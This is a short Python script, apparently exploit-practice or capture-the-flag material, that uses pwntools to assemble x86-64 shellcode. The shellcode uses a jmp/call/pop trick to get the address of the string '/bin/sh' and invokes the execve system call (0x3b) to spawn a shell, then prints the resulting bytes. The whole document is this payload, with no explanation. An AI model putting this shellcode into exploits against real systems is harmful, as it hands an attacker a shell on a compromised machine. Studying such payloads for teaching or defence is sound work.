from pwn import *

hello = asm('''

	jmp hello
write :
	mov rax, 0x3b
	mov rsi, 0
	pop rdi
	mov rdx, 0
	syscall
hello :
	call write
	.ascii "/bin/sh"
	.byte 0

''', arch = "amd64")

print( hello )

